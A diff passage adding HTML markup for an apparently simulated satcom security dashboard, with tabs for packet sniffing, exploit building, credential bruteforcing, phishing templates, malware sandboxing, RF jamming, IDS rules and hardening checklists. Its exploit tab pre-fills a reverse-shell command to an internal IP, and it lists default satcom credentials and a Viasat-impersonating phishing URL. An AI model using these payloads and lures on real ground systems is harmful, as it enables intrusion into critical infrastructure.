+                            <button onclick="downloadReportElement('exploit-console-log', 'Exploitation_Assessment_Report.txt')" class="bg-slate-850 hover:bg-slate-700 text-slate-300 px-3 py-1.5 rounded-lg font-semibold text-xs border border-slate-700">Export Payload Run</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB 5: ELEMENT 3 - NETWORK ANALYSIS TOOL -->
+            <div id="net-analysis" class="tab-content space-y-6 hidden">
+                <div>
+                    <h2 class="text-xl font-bold text-white">🌐 Element 3: Network Interpretation & Packet Sniffer</h2>
+                    <p class="text-xs text-slate-400">Real-time packet parsing interface with PCAP stream preview and protocols classification metrics.</p>
+                </div>
+
+                <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                    <div class="bg-cyber-surface border border-slate-800 p-6 rounded-xl space-y-4 flex flex-col justify-between">
+                        <div class="space-y-4">
+                            <h3 class="text-sm font-bold text-white border-b border-slate-800 pb-2">Sniffer Settings</h3>
+                            <div class="space-y-3 text-xs">
+                                <div>
+                                    <label class="block text-slate-400 mb-1">Target Monitoring Interface</label>
+                                    <select id="net-interface" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200">
+                                        <option value="eth0">eth0 (Internal Ground Management Plane)</option>
+                                        <option value="wlan0">wlan0 (Local Field Terminal Access)</option>
+                                        <option value="sat0">sat0 (Raw RF Carrier Demodulated Stream)</option>
+                                    </select>
+                                </div>
+                                <div>
+                                    <label class="block text-slate-400 mb-1">Traffic Filter Protocol</label>
+                                    <input type="text" id="net-filter" value="tcp and (port 80 or 443 or 7547)" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200 font-mono">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="space-y-2 pt-4">
+                            <button onclick="startSnifferEngine(true)" class="w-full bg-cyan-500 hover:bg-cyan-600 text-slate-950 font-bold py-2.5 rounded-lg text-xs transition-all flex items-center justify-center gap-2">
+                                <span>▶️ Start Packet Inspection</span>
+                            </button>
+                            <button onclick="startSnifferEngine(false)" class="w-full bg-slate-800 hover:bg-slate-700 text-slate-300 py-2.5 rounded-lg text-xs font-semibold">
+                                <span>⏹️ Stop Live Sniffing</span>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="lg:col-span-2 bg-cyber-surface border border-slate-800 p-6 rounded-xl flex flex-col justify-between">
+                        <div class="space-y-4">
+                            <div class="flex justify-between items-center border-b border-slate-800 pb-2">
+                                <h3 class="text-sm font-bold text-white">Parsed Protocol Stream Frame</h3>
+                                <span class="text-[9px] font-mono font-bold bg-cyan-500/10 border border-cyan-500/20 text-cyan-400 px-2 py-0.5 rounded" id="net-packets-count">0 packets</span>
+                            </div>
+                            <div class="bg-slate-950 rounded-lg border border-slate-800 p-4 font-mono text-[10px] leading-relaxed text-emerald-400/90 h-64 overflow-y-auto whitespace-pre" id="net-packet-console"># Packet stream offline. Activate sniffer to listen on ground interfaces...</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB 6: ELEMENT 4 - EXPLOIT DEVELOPMENT KIT -->
+            <div id="exploit-dev" class="tab-content space-y-6 hidden">
+                <div>
+                    <h2 class="text-xl font-bold text-white">💻 Element 4: Exploit Formulation Kit</h2>
+                    <p class="text-xs text-slate-400">Interactive workspace to construct and encrypt payloads targeted at specific router architectures.</p>
+                </div>
+
+                <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                    <div class="bg-cyber-surface border border-slate-800 p-6 rounded-xl space-y-4">
+                        <h3 class="text-sm font-bold text-white border-b border-slate-800 pb-2">Payload Specifications</h3>
+                        <div class="space-y-3 text-xs">
+                            <div>
+                                <label class="block text-slate-400 mb-1">Target CPU Architecture</label>
+                                <select id="payload-arch" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200 font-mono">
+                                    <option value="mips">MIPS (Big-Endian Ground Modems)</option>
+                                    <option value="arm">ARM (Axyom Satellite Gateway Components)</option>
+                                    <option value="x86">x86_64 (Terminal Management Controllers)</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="block text-slate-400 mb-1">Payload Shellcode Command</label>
+                                <input type="text" id="payload-shellcode-cmd" value="/bin/sh -i >& /dev/tcp/10.122.44.18/4444 0>&1" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200 font-mono">
+                            </div>
+                            <div>
+                                <label class="block text-slate-400 mb-1">Payload Encoder Bypass</label>
+                                <select id="payload-encoder" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200">
+                                    <option value="none">None - Raw ASCII Characters</option>
+                                    <option value="base64">Base64 Encoded Envelope</option>
+                                    <option value="hex">Hexadecimal Byte Escape Codes (\\x00)</option>
+                                </select>
+                            </div>
+                        </div>
+                        <button onclick="compileExploitPayload()" class="w-full bg-cyan-500 hover:bg-cyan-600 text-slate-950 font-bold py-2.5 rounded-lg text-xs transition-all">
+                            Assemble & Encode Payload
+                        </button>
+                    </div>
+
+                    <div class="lg:col-span-2 bg-cyber-surface border border-slate-800 p-6 rounded-xl flex flex-col justify-between">
+                        <div class="space-y-4">
+                            <h3 class="text-sm font-bold text-white border-b border-slate-800 pb-2">Compiled Shellcode Assembly Output</h3>
+                            <div class="bg-slate-950 rounded-lg border border-slate-800 p-4 font-mono text-[11px] leading-relaxed text-cyan-400 select-all h-64 overflow-y-auto whitespace-pre" id="payload-assembly-box"># Exploit builder standing by. Choose properties and run assembler...</div>
+                        </div>
+                        <div class="pt-4 border-t border-slate-800 mt-4 flex gap-2">
+                            <button onclick="copyElementContent('payload-assembly-box')" class="flex-1 bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs py-2 rounded-lg font-semibold">📋 Copy Payload</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB 7: ELEMENT 5 - PASSWORD CRACKING & RECOVERY -->
+            <div id="pass-crack" class="tab-content space-y-6 hidden">
+                <div>
+                    <h2 class="text-xl font-bold text-white">🔑 Element 5: Credential Strength Verification & Bruteforce Engine</h2>
+                    <p class="text-xs text-slate-400">Verifying access authentication resilience against common factory default databases.</p>
+                </div>
+
+                <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                    <div class="bg-cyber-surface border border-slate-800 p-6 rounded-xl space-y-4">
+                        <h3 class="text-sm font-bold text-white border-b border-slate-800 pb-2">Bruteforce Engine Properties</h3>
+                        <div class="space-y-3 text-xs">
+                            <div>
+                                <label class="block text-slate-400 mb-1">Target Authentication Mode</label>
+                                <select id="crack-target-type" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200">
+                                    <option value="snmp">SNMP Community Strings Verification</option>
+                                    <option value="ssh">SSH Console Password Verification</option>
+                                    <option value="telnet">Unencrypted Telnet Portal verification</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="block text-slate-400 mb-1">Target Address</label>
+                                <input type="text" id="crack-target-ip" value="192.168.100.1" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200 font-mono">
+                            </div>
+                            <div>
+                                <label class="block text-slate-400 mb-1">Authentication Wordlist</label>
+                                <select id="crack-wordlist" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200">
+                                    <option value="satcom">Satcom Standard Credentials (admin, root, operator, viasat, hughes)</option>
+                                    <option value="rockyou">Common Brute List (Truncated RockYou Database)</option>
+                                </select>
+                            </div>
+                        </div>
+                        <button onclick="executeBruteforceRun()" class="w-full bg-cyan-500 hover:bg-cyan-600 text-slate-950 font-bold py-2.5 rounded-lg text-xs transition-all">
+                            Launch Authentication Probe
+                        </button>
+                    </div>
+
+                    <div class="lg:col-span-2 bg-cyber-surface border border-slate-800 p-6 rounded-xl flex flex-col justify-between">
+                        <div class="space-y-4">
+                            <div class="flex justify-between items-center border-b border-slate-800 pb-2">
+                                <h3 class="text-sm font-bold text-white">Verification Engine Log</h3>
+                                <div class="w-32 bg-slate-950 rounded-full h-2 border border-slate-800 overflow-hidden">
+                                    <div id="crack-progress-bar" class="bg-cyan-400 h-full w-0 transition-all duration-300"></div>
+                                </div>
+                            </div>
+                            <div class="bg-slate-950 rounded-lg border border-slate-800 p-4 font-mono text-[11px] leading-relaxed text-yellow-400/90 h-64 overflow-y-auto whitespace-pre" id="crack-console-log"># Verification database offline. Run probe to verify local parameters.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB 8: ELEMENT 6 - SOCIAL ENGINEERING SIMULATOR -->
+            <div id="social-eng" class="tab-content space-y-6 hidden">
+                <div>
+                    <h2 class="text-xl font-bold text-white">🎣 Element 6: Phishing Awareness Simulator</h2>
+                    <p class="text-xs text-slate-400">Evaluate human factors inside Network Control Centers via controlled notification templates.</p>
+                </div>
+
+                <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                    <div class="bg-cyber-surface border border-slate-800 p-6 rounded-xl space-y-4">
+                        <h3 class="text-sm font-bold text-white border-b border-slate-800 pb-2">Simulation Scenario Builder</h3>
+                        <div class="space-y-3 text-xs">
+                            <div>
+                                <label class="block text-slate-400 mb-1">NCC Notification Template</label>
+                                <select id="se-template-selector" onchange="updatePhishingTemplatePreview()" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200">
+                                    <option value="fw-update">Viasat Modem Firmware Warning Notification</option>
+                                    <option value="auth-bypass">Ground Segment Administrative Access Required</option>
+                                    <option value="maritime-fail">Maritime Link Failover Emergency Check</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="block text-slate-400 mb-1">Simulated Landing Destination URL</label>
+                                <input type="text" id="se-landing-url" value="http://sec-viasat-update.lan/auth/verification" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200 font-mono text-xs">
+                            </div>
+                        </div>
+                        <button onclick="launchSocialEngSimulator()" class="w-full bg-cyan-500 hover:bg-cyan-600 text-slate-950 font-bold py-2.5 rounded-lg text-xs transition-all">
+                            Deploy Phishing Awareness Check
+                        </button>
+                    </div>
+
+                    <div class="lg:col-span-2 bg-cyber-surface border border-slate-800 p-6 rounded-xl flex flex-col justify-between">
+                        <div class="space-y-4">
+                            <h3 class="text-sm font-bold text-white border-b border-slate-800 pb-2">Synthesized Notification Text</h3>
+                            <div class="bg-slate-950 rounded-lg border border-slate-800 p-4 font-mono text-[11px] leading-relaxed text-slate-300 h-64 overflow-y-auto whitespace-pre-wrap select-all" id="se-template-preview-box">Loading Notification Properties...</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB 9: ELEMENT 7 - MALWARE ANALYSIS ENVIRONMENT -->
+            <div id="malware-sandbox" class="tab-content space-y-6 hidden">
+                <div>
+                    <h2 class="text-xl font-bold text-white">☣️ Element 7: Sandbox Malware Behavior Simulation</h2>
+                    <p class="text-xs text-slate-400">Isolated simulator mapping executable behaviors inside embedded router structures.</p>
+                </div>
+
+                <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                    <div class="bg-cyber-surface border border-slate-800 p-6 rounded-xl space-y-4 flex flex-col justify-between">
+                        <div class="space-y-4">
+                            <h3 class="text-sm font-bold text-white border-b border-slate-800 pb-2">Analysis Controls</h3>
+                            <div class="space-y-3 text-xs">
+                                <div>
+                                    <label class="block text-slate-400 mb-1">Select Uploaded File Parameter</label>
+                                    <select id="malware-bin-file" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200 font-mono">
+                                        <option value="vsat_agent.bin">vsat_agent_mips.bin (Dynamic Command Module)</option>
+                                        <option value="backdoor_tr069.elf">backdoor_tr069.elf (ACS Payload Emulator)</option>
+                                    </select>
+                                </div>
+                                <div>
+                                    <label class="block text-slate-400 mb-1">Execution Mode</label>
+                                    <select id="malware-sandbox-depth" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200">
+                                        <option value="static">Static Analysis & Strings Mapping Only</option>
+                                        <option value="dynamic">Dynamic Kernel Calls Tracking simulation</option>
+                                    </select>
+                                </div>
+                            </div>
+                        </div>
+                        <button onclick="runMalwareAnalysisSimulation()" class="w-full bg-cyan-500 hover:bg-cyan-600 text-slate-950 font-bold py-2.5 rounded-lg text-xs transition-all">
+                            Initialize Sandbox Verification
+                        </button>
+                    </div>
+
+                    <div class="lg:col-span-2 bg-cyber-surface border border-slate-800 p-6 rounded-xl flex flex-col justify-between">
+                        <div class="space-y-4">
+                            <h3 class="text-sm font-bold text-white border-b border-slate-800 pb-2">Isolated Behavior Logger</h3>
+                            <div class="bg-slate-950 rounded-lg border border-slate-800 p-4 font-mono text-[10px] leading-relaxed text-red-400 h-64 overflow-y-auto whitespace-pre" id="malware-sandbox-console"># Sandbox idle. Load target file package and trigger execution process.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB 10: ELEMENT 8 - INCIDENT RESPONSE & FORENSICS -->
+            <div id="incident-forensics" class="tab-content space-y-6 hidden">
+                <div>
+                    <h2 class="text-xl font-bold text-white">📋 Element 8: Incident Forensics & Advisory Matcher</h2>
+                    <p class="text-xs text-slate-400">Parse system metrics and logs against the threat parameters simulated inside <strong>vsat_detection.py</strong>.</p>
+                </div>
+
+                <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                    <div class="lg:col-span-2 bg-cyber-surface border border-slate-800 p-6 rounded-xl space-y-4">
+                        <div class="flex justify-between items-center border-b border-slate-800 pb-2">
+                            <h3 class="text-sm font-bold text-white">Active System Log Analyzer</h3>
+                            <button onclick="injectForensicsMockLogs()" class="bg-cyan-500 hover:bg-cyan-600 text-slate-950 text-xs px-3 py-1 rounded font-bold">Inject Mock Syslogs</button>
+                        </div>
+                        <div class="text-xs space-y-1">
+                            <label class="block text-slate-400 font-semibold">Active Log Entry Buffer</label>
+                            <textarea id="forensics-log-input" rows="8" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200 font-mono text-xs leading-relaxed" placeholder="Paste syslog entries or click Inject Mock Syslogs..."></textarea>
+                        </div>
+                        <div class="flex justify-end">
+                            <button onclick="runForensicsAnalyzer()" class="bg-cyan-500 hover:bg-cyan-600 text-slate-950 font-bold text-xs px-4 py-2 rounded-lg transition-all">
+                                Execute Detection Engine Scan
+                            </button>
+                        </div>
+                        <div id="forensics-result-alert" class="hidden">
+                            <!-- Dynamically injected results -->
+                        </div>
+                    </div>
+
+                    <!-- Playbook Compiler -->
+                    <div class="bg-cyber-surface border border-slate-800 p-6 rounded-xl flex flex-col justify-between">
+                        <div class="space-y-4">
+                            <h3 class="text-sm font-bold text-white border-b border-slate-800 pb-2">Playbook Engine</h3>
+                            <div class="space-y-3 text-xs">
+                                <div>
+                                    <label class="block text-slate-400 mb-1">Observed Threat Vector</label>
+                                    <select id="forensics-vector-selector" class="w-full bg-slate-950 border border-slate-800 p-2 rounded text-slate-200">
+                                        <option value="cve-2024-6199">CVE-2024-6199 (Viasat Command Bypass)</option>
+                                        <option value="cred-brute">SSH / Telnet Brute Force Attempt</option>
+                                        <option value="rf-spoof">RF Telemetry / GPS Anomaly Warning</option>
+                                    </select>
+                                </div>
+                            </div>
+                            <div class="bg-slate-950 border border-slate-800 rounded-lg p-3 h-48 overflow-y-auto font-mono text-[10px] leading-relaxed text-slate-300" id="forensics-playbook-output">
+[Playbook Engine Idle]
+                            </div>
+                        </div>
+                        <button onclick="generatePlaybookIR()" class="w-full bg-cyan-500 hover:bg-cyan-600 text-slate-950 text-xs py-2 rounded-lg font-bold">Compile Response Playbook</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB 11: ELEMENT 9 - AUTOMATED REPORTING SYSTEMS -->
+            <div id="auto-reporting" class="tab-content space-y-6 hidden">
+                <div>
+                    <h2 class="text-xl font-bold text-white">📥 Element 9: Comprehensive Vulnerability Reporting Compiler</h2>
+                    <p class="text-xs text-slate-400">Generate executive documents summarizing penetration findings, compliance parameters, and mitigation strategies.</p>
+                </div>
+
+                <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                    <div class="bg-cyber-surface border border-slate-800 p-6 rounded-xl space-y-4">
+                        <h3 class="text-sm font-bold text-white border-b border-slate-800 pb-2">Report Document Architect</h3>
+                        <div class="space-y-3 text-xs">
+                            <div>
+                                <label class="block text-slate-400 mb-1">Target Client Environment</label>
+                                <select id="report-client-type" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200">
+                                    <option value="Maritime / Shipping Terminal">Maritime / Shipping Terminal</option>
+                                    <option value="Energy / Pipeline Gateway">Energy / Pipeline Gateway</option>
+                                    <option value="Defense / Government NOC Command Segment">Defense / Government NOC Command Segment</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="block text-slate-400 mb-1">Audit Authority Code</label>
+                                <input type="text" id="report-auth-code" value="AUTH-SATCOM-2026-99" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200 font-mono">
+                            </div>
+                            <div>
+                                <label class="block text-slate-400 mb-1">Compliance Standard Target</label>
+                                <select id="report-compliance-type" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200">
+                                    <option value="NSA-CISA-2026">Joint NSA-CISA Ground Hardening Directives</option>
+                                    <option value="ISO-27001">ISO/IEC 27001 Information Control Structures</option>
+                                </select>
+                            </div>
+                        </div>
+                        <button onclick="compileExecutiveReport()" class="w-full bg-cyan-500 hover:bg-cyan-600 text-slate-950 font-bold py-2.5 rounded-lg text-xs transition-all">
+                            Compile Executive PDF/Markdown Report
+                        </button>
+                    </div>
+
+                    <div class="lg:col-span-2 bg-cyber-surface border border-slate-800 p-6 rounded-xl flex flex-col justify-between">
+                        <div class="space-y-4">
+                            <h3 class="text-sm font-bold text-white border-b border-slate-800 pb-2">Formulated Document Preview</h3>
+                            <div class="bg-slate-950 rounded-lg border border-slate-800 p-4 font-mono text-[10px] leading-relaxed text-cyan-400/90 h-64 overflow-y-auto whitespace-pre select-all" id="report-preview-box"># Reporting Engine Idle. Click compile to package all metrics across active states.</div>
+                        </div>
+                        <div class="pt-4 border-t border-slate-800 mt-4 flex gap-2">
+                            <button onclick="copyElementContent('report-preview-box')" class="flex-1 bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs py-2 rounded-lg font-semibold">📋 Copy Document Layout</button>
+                            <button onclick="downloadReportElement('report-preview-box', 'VSAT_Compliance_Audit_Report.txt')" class="flex-1 bg-cyan-500 hover:bg-cyan-600 text-slate-950 text-xs py-2 rounded-lg font-bold">💾 Download Text Document</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB 11.5: ELEMENT 10 - RF JAMMING & SPECTRUM ANALYZER -->
+            <div id="rf-jamming" class="tab-content space-y-6 hidden">
+                <div>
+                    <h2 class="text-xl font-bold text-white">📡 Element 10: Advanced RF Jamming & Spectrum Analyzer</h2>
+                    <p class="text-xs text-slate-400">Evaluate transponder resilience against uplink spoofing, multi-path fading, and intentional narrow-band interference.</p>
+                </div>
+                <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                    <div class="bg-cyber-surface border border-slate-800 p-6 rounded-xl space-y-4">
+                        <h3 class="text-sm font-bold text-white border-b border-slate-800 pb-2">Interference Controls</h3>
+                        <div class="space-y-3 text-xs">
+                            <div>
+                                <label class="block text-slate-400 mb-1">Select Jamming Profile</label>
+                                <select id="jamming-profile" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200">
+                                    <option value="none">No Active Jamming (Clear Carrier)</option>
+                                    <option value="sweep">Swept-Frequency Chirp Interference</option>
+                                    <option value="comb">Multi-Carrier Comb Jamming</option>
+                                    <option value="barrage">Broadband Noise Barrage (Uplink Saturation)</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="block text-slate-400 mb-1">Target Transponder Band</label>
+                                <select id="jamming-band" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200 font-mono">
+                                    <option value="ku">Ku-Band (11.5 - 12.7 GHz)</option>
+                                    <option value="ka">Ka-Band (26.5 - 40.0 GHz)</option>
+                                    <option value="c">C-Band (3.7 - 4.2 GHz)</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="block text-slate-400 mb-1">Uplink Attenuation (dB)</label>
+                                <input type="range" id="jamming-attenuation" min="0" max="30" value="0" class="w-full accent-cyan-500" oninput="updateAttenuationLabel(this.value)">
+                                <div class="flex justify-between text-[10px] text-slate-400 mt-1">
+                                    <span>0 dB (Max Signal)</span>
+                                    <span id="attenuation-val">0 dB</span>
+                                    <span>30 dB (Null Link)</span>
+                                </div>
+                            </div>
+                        </div>
+                        <button onclick="applyJammingSimulation()" class="w-full bg-cyan-500 hover:bg-cyan-600 text-slate-950 font-bold py-2.5 rounded-lg text-xs transition-all">
+                            Inject RF Interference Parameters
+                        </button>
+                    </div>
+                    <div class="lg:col-span-2 bg-cyber-surface border border-slate-800 p-6 rounded-xl flex flex-col justify-between">
+                        <div class="space-y-4">
+                            <h3 class="text-sm font-bold text-white border-b border-slate-800 pb-2">Real-time Spectral Waveform</h3>
+                            <canvas id="spectrogram-canvas" class="w-full bg-slate-950 rounded-lg border border-slate-800" style="height: 180px;"></canvas>
+                        </div>
+                        <div class="pt-4 border-t border-slate-800 mt-4 flex justify-between items-center text-xs">
+                            <span class="text-slate-400 font-mono" id="rf-spectral-status">Spectral Health: Nominal</span>
+                            <span class="text-[10px] text-slate-500 font-mono">Carrier Null Tracking</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB 11.6: ELEMENT 11 - IDS RULES & CORRELATION ENGINE -->
+            <div id="ids-engine" class="tab-content space-y-6 hidden">
+                <div>
+                    <h2 class="text-xl font-bold text-white">🛡️ Element 11: Intrusion Detection System & Rule Builder</h2>
+                    <p class="text-xs text-slate-400">Design custom network defense signature rules (similar to Snort) to inspect live streams and trigger alarms.</p>
+                </div>
+                <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                    <div class="bg-cyber-surface border border-slate-800 p-6 rounded-xl space-y-4">
+                        <h3 class="text-sm font-bold text-white border-b border-slate-800 pb-2">IDS Rule Constructor</h3>
+                        <div class="space-y-3 text-xs">
+                            <div>
+                                <label class="block text-slate-400 mb-1">Rule Action</label>
+                                <select id="ids-rule-action" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200">
+                                    <option value="alert">ALERT (Log warning sequence)</option>
+                                    <option value="drop">DROP (Mitigate/block connection path)</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="block text-slate-400 mb-1">Target Protocol</label>
+                                <select id="ids-rule-proto" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200 font-mono">
+                                    <option value="TCP">TCP</option>
+                                    <option value="UDP">UDP</option>
+                                    <option value="ICMP">ICMP</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="block text-slate-400 mb-1">Signature Content Match</label>
+                                <input type="text" id="ids-rule-content" value="viasat_config" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200 font-mono text-xs">
+                            </div>
+                        </div>
+                        <button onclick="compileAndRegisterIDSRule()" class="w-full bg-cyan-500 hover:bg-cyan-600 text-slate-950 font-bold py-2.5 rounded-lg text-xs transition-all">
+                            Inject Signature Rule into IDS Kernel
+                        </button>
+                    </div>
+                    <div class="lg:col-span-2 bg-cyber-surface border border-slate-800 p-6 rounded-xl flex flex-col justify-between">
+                        <div class="space-y-4">
+                            <h3 class="text-sm font-bold text-white border-b border-slate-800 pb-2">Active Signature Engine Monitor</h3>
+                            <div class="bg-slate-950 rounded-lg border border-slate-800 p-4 font-mono text-[10px] leading-relaxed text-emerald-400 h-64 overflow-y-auto whitespace-pre" id="ids-engine-console"># IDS Kernel running. No active signature rules loaded.</div>
+                        </div>
+                        <div class="pt-4 border-t border-slate-800 mt-4 flex justify-between items-center text-xs">
+                            <span class="text-slate-400" id="ids-rules-count">Active Rules: 0</span>
+                            <button onclick="clearActiveIDSRules()" class="bg-slate-850 hover:bg-slate-700 text-slate-300 px-3 py-1.5 rounded-lg font-semibold text-xs border border-slate-700">Flush Rules</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB 12: NSA / CISA COMPLIANCE -->
+            <div id="hardening" class="tab-content space-y-6 hidden">
+                <div>
+                    <h2 class="text-xl font-bold text-white">🔒 NSA & CISA Ground Hardening Compliance Matrices</h2>
+                    <p class="text-xs text-slate-400">Benchmark your administrative posturing metrics against Joint NSA-CISA 2026 directives.</p>
+                </div>
+
+                <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
+                    <div class="bg-cyber-surface border border-slate-800 p-6 rounded-xl flex flex-col items-center justify-center text-center">
+                        <h3 class="text-xs font-bold text-white uppercase tracking-wider mb-4">Post-Audit Score</h3>
+                        <div class="relative flex items-center justify-center">
+                            <svg class="w-36 h-36 transform -rotate-90">
+                                <circle cx="72" cy="72" r="60" stroke="currentColor" stroke-width="8" class="text-slate-800" fill="transparent"></circle>
+                                <circle id="compliance-svg-ring" cx="72" cy="72" r="60" stroke="currentColor" stroke-width="8" class="text-cyan-500 transition-all duration-500" stroke-dasharray="376.99" stroke-dashoffset="376.99" fill="transparent"></circle>
+                            </svg>
+                            <span id="compliance-percentage-text" class="absolute text-2xl font-bold font-mono text-white">0%</span>
+                        </div>
+                        <div class="mt-4 space-y-1">
+                            <p class="text-xs font-bold" id="compliance-text-rating">Posturing Status: Weak</p>
+                            <p class="text-[10px] text-slate-400">Enable recommended hardening safeguards to raise ratings.</p>
+                        </div>
+                    </div>
+
+                    <div class="lg:col-span-3 bg-cyber-surface border border-slate-800 p-6 rounded-xl space-y-4">
+                        <h3 class="text-sm font-bold text-white tracking-wide uppercase border-b border-slate-800 pb-2">Safeguards Checklist</h3>
+                        <div class="space-y-3 text-xs" id="compliance-checkboxes-container">
+                            <label class="flex items-start gap-3 p-3 bg-slate-950/80 border border-slate-800 rounded-lg cursor-pointer hover:border-slate-700 transition-all">
+                                <input type="checkbox" id="chk-secure-creds" onchange="calculateComplianceScore()" class="mt-0.5 accent-cyan-500 compliance-chk">
+                                <div>
+                                    <strong class="text-cyan-400 block font-bold">1. Change Factory Default Credentials & Secure SNMP</strong>
+                                    <span class="text-slate-400">Ensure default strings like 'public' or admin keys are updated across configurations or migrated completely to SNMPv3 authenticated metrics.</span>
+                                </div>
+                            </label>
+                            <label class="flex items-start gap-3 p-3 bg-slate-950/80 border border-slate-800 rounded-lg cursor-pointer hover:border-slate-700 transition-all">
+                                <input type="checkbox" id="chk-enforce-https" onchange="calculateComplianceScore()" class="mt-0.5 accent-cyan-500 compliance-chk">
+                                <div>
+                                    <strong class="text-cyan-400 block font-bold">2. Enforce TLS 1.2+ for HTTPS Administration Ports (Disable Port 80 HTTP)</strong>
+                                    <span class="text-slate-400">Decommission raw HTTP services. Prevent command-injection attacks like CVE-2024-6199 over unencrypted paths by requiring TLS 1.2/1.3.</span>
+                                </div>
+                            </label>
+                            <label class="flex items-start gap-3 p-3 bg-slate-950/80 border border-slate-800 rounded-lg cursor-pointer hover:border-slate-700 transition-all">
+                                <input type="checkbox" id="chk-network-seg" onchange="calculateComplianceScore()" class="mt-0.5 accent-cyan-500 compliance-chk">
+                                <div>
+                                    <strong class="text-cyan-400 block font-bold">3. Network Segmentation (Isolate satcom VLAN management)</strong>
+                                    <span class="text-slate-400">Air-gap management planes from generic workstation segments to secure administrative access. Prevents active subnet scans.</span>
+                                </div>
+                            </label>
+                            <label class="flex items-start gap-3 p-3 bg-slate-950/80 border border-slate-800 rounded-lg cursor-pointer hover:border-slate-700 transition-all">
+                                <input type="checkbox" id="chk-code-sig" onchange="calculateComplianceScore()" class="mt-0.5 accent-cyan-500 compliance-chk">
+                                <div>
+                                    <strong class="text-cyan-400 block font-bold">4. Implement Cryptographic Code Signature Checks</strong>
+                                    <span class="text-slate-400">Prevent malicious firmware payloads (analyzed in Element 7) or unverified exploit scripts from running on ground-station processors.</span>
+                                </div>
+                            </label>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB 13: SCRIPTS & CODE LIBRARIES -->
+            <div id="codes" class="tab-content space-y-6 hidden">
+                <div>
+                    <h2 class="text-xl font-bold text-white">📜 Production Code & Automation Modules</h2>
+                    <p class="text-xs text-slate-400">Operational modules mimicking the logic found inside <strong>vsat_detection.py</strong>.</p>
+                </div>
+
+                <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
+                    <div class="bg-cyber-surface border border-slate-800 p-4 rounded-xl space-y-1">
+                        <p class="text-[10px] font-bold text-slate-500 tracking-wider uppercase px-2 pb-2">Module Scripts</p>
+                        <button onclick="displayLibraryScript('cve-rce')" class="lib-btn w-full text-left text-xs p-2.5 rounded-lg bg-slate-950 border border-cyan-500/30 text-cyan-400 font-semibold">
+                            🐞 CVE-2024-6199 Python Audit
+                        </button>
+                        <button onclick="displayLibraryScript('tr069')" class="lib-btn w-full text-left text-xs p-2.5 rounded-lg hover:bg-slate-900 text-slate-400">
+                            🔍 TR-069 Traffic Monitor
+                        </button>
+                        <button onclick="displayLibraryScript('signal')" class="lib-btn w-full text-left text-xs p-2.5 rounded-lg hover:bg-slate-900 text-slate-400">
+                            📊 RF Telemetry Baseline
+                        </button>
+                    </div>
+
+                    <div class="lg:col-span-3 bg-cyber-surface border border-slate-800 p-6 rounded-xl flex flex-col justify-between">
+                        <div class="space-y-4">
+                            <div class="flex justify-between items-center border-b border-slate-800 pb-2">
+                                <h3 id="script-title" class="text-sm font-bold text-white tracking-wide uppercase">CVE-2024-6199 RCE Web Scanner</h3>
